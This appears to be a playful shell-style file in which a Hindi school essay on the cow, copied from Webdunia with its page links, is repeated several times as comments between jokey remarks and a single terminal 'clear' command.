#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा





#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#यदि समझ आ गया तो अब सो जाओ




clear
























































#स्वगत है मेरा script में
































#आज हम सीखेंगे की गाय किसी कहते है ओर उसी के विषय मे सब कुछ



















#ओर नीचे आओ













#👇👇




































#👇👇👇👇










































































#👇👇👇👇👇👇👇👇👇👇👇








































































#यदि देखने का मन नही है तो मत देखो










































#👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇
















































#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा








#फिर से पढ़ लो











#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा



#गाय पर हिन्दी में निबंध


#Webdunia
#भूमिका : गाय का यूं तो पूरी दुनिया में ही काफी महत्व है, लेकिन भारत के संदर्भ में बात की जाए तो प्राचीन काल से यह भारत की अर्थव्यवस्था की रीढ़ रही है। चाहे वह दूध का मामला हो या फिर खेती के काम में आने वाले बैलों का। वैदिक काल में गायों की संख्‍या व्यक्ति की समृद्धि का मानक हुआ करती थी। दुधारू पशु होने के कारण यह बहुत उपयोगी घरेलू पशु है। 
 
#उपयोगिता : गाय का दूध बहुत ही पौष्टिक होता है। यह बीमारों और बच्चों के लिए बेहद उपयोगी आहार माना जाता है। इसके अलावा दूध से कई तरह के पकवान बनते हैं। दूध से दही, पनीर, मक्खन और घी भी बनाता है। गाय का घी और गोमूत्र अनेक आयुर्वेदिक औषधियां बनाने के काम भी काम आता है।

#गाय का गोबर फसलों के लिए सबसे उत्तम खाद है। गाय के मरने के बाद उसका चमड़ा, हड्डियां व सींग सहित सभी अंग किसी न किसी काम आते हैं। 

 
#अन्य पशुओं की तुलना में गाय का दूध बहुत उपयोगी होता है। बच्चों को विशेष तौर पर गाय का दूध पिलाने की सलाह दी जाती है क्योंकि भैंस का दूध जहां सुस्ती लाता है, वहीं गाय का दूध बच्चों में चंचलता बनाए रखता है। माना जाता है कि भैंस का बच्चा (पाड़ा) दूध पीने के बाद सो जाता है, जबकि गाय का बछड़ा अपनी मां का दूध पीने के बाद उछल-कूद करता है।
 
#गाय न सिर्फ अपने जीवन में लोगों के लिए उपयोगी होती है वरन मरने के बाद भी उसके शरीर का हर अंग काम आता है। गाय का चमड़ा, सींग, खुर से दैनिक जीवनोपयोगी सामान तैयार होता है। गाय की हड्‍डियों से तैयार खाद खेती के काम आती है।
 
 
#गाय की शारीरिक संरचना : गाय का एक मुंह, दो आंखें, दो कान, चार थन, दो सींग, दो नथुने तथा चार पांव होते हैं। पांवों के खुर गाय के लिए जूतों का काम करते हैं। गाय की पूंछ लंबी होती है तथा उसके किनारे पर एक गुच्छा भी होता है, जिसे वह मक्खियां आदि उड़ाने के काम में लेती है। गाय की एकाध प्रजाति में सींग नहीं होते। 
 
#गायों की प्रमुख नस्लें : गायों की यूं तो कई नस्लें होती हैं, लेकिन भारत में मुख्‍यत: सहिवाल (पंजाब, हरियाणा, दिल्ली, उत्तरप्रदेश, बिहार), गीर (दक्षिण काठियावाड़), थारपारकर (जोधपुर, जैसलमेर, कच्छ), करन फ्राइ (राजस्थान) आदि हैं। विदेशी नस्ल में जर्सी गाय सर्वाधिक लोकप्रिय है। यह गाय दूध भी अधिक देती है। भारतीय गाय छोटी होती है, जबकि विदेशी गाय का शरीर थोड़ा भारी होता है।

 
#गाय के रंग : गाय कई रंगों जैसे सफेद, काला, लाल, बादामी तथा चितकबरी होती है।
 #
#
#गाय का धार्मिक महत्व : भारत में गाय को देवी का दर्जा प्राप्त है। ऐसी मान्यता है कि गाय के शरीर में 33 करोड़ देवताओं का निवास है। यही कारण है कि दिवाली के दूसरे दिन गोवर्धन पूजा के अवसर पर गायों की विशेष पूजा की जाती है और उनका मोर पंखों आदि से श्रृंगार किया जाता है।
 #
#प्रा#चीन भारत में गाय समृद्धि का प्रतीक मानी जाती थी। युद्ध के दौरान स्वर्ण, आभूषणों के साथ गायों को भी लूट लिया जाता था। जिस राज्य में जितनी गायें होती थीं उसको उतना ही सम्पन्न माना जाता है। कृष्ण के गाय प्रेम को भला कौन नहीं जानता। इसी कारण उनका एक नाम गोपाल भी है। 
#
#निष्कर्ष : दुर्भाग्य से शहरों में जिस तरह पॉलिथिन का उपयोग किया जाता है और उसे फेंक दिया जाता है, उसे खाकर गायों की असमय मौत हो जाती है। इस दिशा में सभी को गंभीरता से विचार करना होगा ताकि हमारी 'आस्था' और 'अर्थव्यवस्था' के प्रतीक गोवंश को बचाया जा सके। कुल मिलाकर गाय का मनुष्य के जीवन में बहुत महत्व है। गाय आज भी ग्रामीण अर्थव्यवस्था की रीढ़ है।
 
#वेबदुनिया पर पढ़ें
#समाचारबॉलीवुडलाइफ स्‍टाइलज्योतिषमहाभारत के किस्सेरामायण की कहानियांधर्म-संसाररोचक और रोमांचक

#सम्बंधित जानकारी
#इ#ंदिरा गांधी पर हिन्दी निबंध
#हिन्दी निबंध : लाल बहादुर शास्त्री
#हिन्दी निबंध : झांसी की रानी लक्ष्मीबाई
#सरदार वल्लभ भाई पटेल पर हिन्दी निबंध
#आदर्श वीरांगना झांसी की रानी लक्ष्मीबाई पर हिन्दी निबंध...
#सभी देखें जरुर पढ़ें
#चटख हरे रंग का पिस्ता कई पोषक तत्वों से है भरपूर, जानें इसके 7 फायदे
#बढ़ती उम्र के प्रभाव को कम करने में कारगर है ये ड्रायफ्रूट, जानिए इसके फायदे
#प्रोटीन, विटामिन तो ठीक है लेकिन क्या सही मात्रा में ले रहे हैं मैग्नीशियम? ऐसे जानें
#ब#ेडौल शरीर को बनाना है परफेक्ट और मोटापे से पाना है निजात, तो जानें 7 काम की बातें
#आधे सिर में होता है दर्द, तो आजमाएं अजवाइन के ये 6 घरेलू नुस्खे
#सभी देखें नवीनतम
#Gopashtami 2019 : 4 नवंबर को गोपाष्टमी पर्व, जानिए कैसे करें गौ पूजन, पढ़ें 11 खास बातें
#गोपाष्टमी 2019 : गाय के पौराणिक और धार्मिक महत्व, जानकर चौंक जाएंगे
#gopashtami 2019 : गाय क्यों है महत्वपूर्ण, जानिए 17 वैज्ञानिक कारण
#Amla Navami 2019 : आंवला नवमी कब है, जानें महत्व, पूजन विधि एवं 10 खास बातें
#आप नहीं जानते होंगे गौ माता के शुभ शकुन से जुड़ीं ये 11 बातें, जानें अचूक उपाय भी
#अगला लेख
#नहाते हुए पुराना लूफाह इस्तेमाल करते हैं तो तुरंत फेंक दे, वर्ना संक्रमण का है खतरा




#गाय पर हिन्दी में निबंध


#Webdunia
